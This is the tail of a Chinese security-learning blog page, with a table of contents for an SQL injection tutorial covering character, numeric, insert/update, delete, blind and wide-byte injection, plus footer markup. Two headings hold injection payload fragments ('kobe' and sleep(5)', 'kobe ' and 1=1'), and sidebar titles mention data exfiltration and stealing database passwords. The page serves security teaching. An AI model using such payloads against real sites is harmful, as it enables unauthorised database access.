href="#1-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-text">1.字符型注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-text">2.数字型注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-xxx%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-text">3.xxx型注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E2%80%9Dinsert-pdate%E2%80%9D%E6%B3%A8%E5%85%A5"><span class="toc-text">4.”insert&#x2F;pdate”注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-insert%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2%E6%B3%A8%E5%85%A5"><span class="toc-text">1.insert登录页面注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-update%E6%B3%A8%E5%85%A5"><span class="toc-text">2.update注入</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-delete%E6%B3%A8%E5%85%A5"><span class="toc-text">5.delete注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E5%9F%BA%E4%BA%8Eboolian%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="toc-text">6.基于boolian的盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#kobe-%E2%80%98-and-1-1"><span class="toc-text">kobe ‘ and 1&#x3D;1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="toc-text">7.基于时间的盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#kobe%E2%80%99-and-sleep-5"><span class="toc-text">kobe’ and sleep(5)</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-text">8.宽字节注入</span></a></li></ol></li></ol>
+  </article>
+  
+  
+  <article class="card card-content">
+    <div class="recent-posts-card">
+  <div class="recent-posts-header"><i class="iconfont icon-wenzhang_huaban" style="padding-right: 2px;"></i>最近文章</div>
+  <div class="recent-posts-list">
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2022-02-23</div>
+        <a href="/2022/02/23/文件包含漏洞/"><div class="recent-posts-item-content">文件包含漏洞</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2022-02-23</div>
+        <a href="/2022/02/23/文件上传漏洞/"><div class="recent-posts-item-content">文件上传漏洞</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2022-02-17</div>
+        <a href="/2022/02/17/mysql数据外带/"><div class="recent-posts-item-content"></div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2022-02-17</div>
+        <a href="/2022/02/17/一：获取数据库网站密码/"><div class="recent-posts-item-content"></div></a>
+      </div>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+          </aside>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <footer class="footer">
+  <div class="footer-container">
+    <div>
+      <div class="footer-dsc">
+        <span>Copyright ©
+          
+          2020 -
+          
+          2022
+        </span>
+        &nbsp;
+        <a href="/" class="footer-link">混口饭吃 </a>
+      </div>
+    </div>
+
+    
+    <div class="footer-dsc">
+      
+      Powered by
+      <a href="https://hexo.io/" class="footer-link" target="_blank" rel="nofollow noopener noreferrer">&nbsp;Hexo </a>
+      
+      
+      <span>&nbsp;|&nbsp;</span>
+      
+      
+      Theme -
+      <a href="https://github.com/theme-kaze" class="footer-link" target="_blank"
+        rel="nofollow noopener noreferrer">&nbsp;Kaze</a>
+      
+    </div>
+    
+    
+    
+    
+</footer>
+  <a role="button" id="scrollbutton" class="basebutton"  aria-label="回到顶部">
+  <i class="iconfont icon-arrowleft button-icon"></i>
+</a>
+<a role="button" id="menubutton" class="basebutton">
+  <i class="iconfont icon-menu button-icon"></i>
+</a>
+<a role="button" id="popbutton" class="basebutton" aria-label="控制中心">
+  <i class="iconfont icon-expand button-icon"></i>
+</a>
+<a role="button" id="darkbutton" class="basebutton darkwidget" aria-label="夜色模式">
+  <i class="iconfont icon-weather button-icon"></i>
+</a>
+<a role="button" id="searchbutton" class="basebutton searchwidget" aria-label="搜索">
+  <i class="iconfont icon-search button-icon"></i>
+</a>
+
+  
+  
+  
+  <script>
+  var addImgLayout = function () {
+    var img = document.querySelectorAll('.post-content img');
+    var i;
+    for (i = 0; i < img.length; i++) {
+      var wrapper = document.createElement('a');
+      wrapper.setAttribute('href', img[i].getAttribute('data-src'));
+      wrapper.setAttribute('aria-label', 'illustration');
+      wrapper.style.cssText = 'width: 100%; display: flex; justify-content: center;';
+      if (img[i].alt) wrapper.dataset.caption = img[i].alt;
+      wrapper.dataset.nolink = true;
+      img[i].before(wrapper);
+      wrapper.append(img[i]);
+      var divWrap = document.createElement('div');
+      divWrap.classList.add('gallery');
+      wrapper.before(divWrap);
+      divWrap.append(wrapper);
+    }
+    baguetteBox.run('.gallery');
+  }
+</script>
+<script>loadScript("/js/lib/lightbox/baguetteBox.min.js", addImgLayout)</script>
+  
+  
+  
+<script src="/js/main.js"></script>
+
+  
+  
+  <script>
+    var addLazyload = function () {
+      var observer = lozad('.lozad', {
+        load: function (el) {
+          el.srcset = el.getAttribute('data-src');
+        },
+        loaded: function (el) {
+          el.classList.add('loaded');
+        }
+      });
+      observer.observe();
+    }
+  </script>
+  <script>loadScript("/js/lib/lozad.min.js", addLazyload)</script>
+  
+  
+</body>
+
+</html>
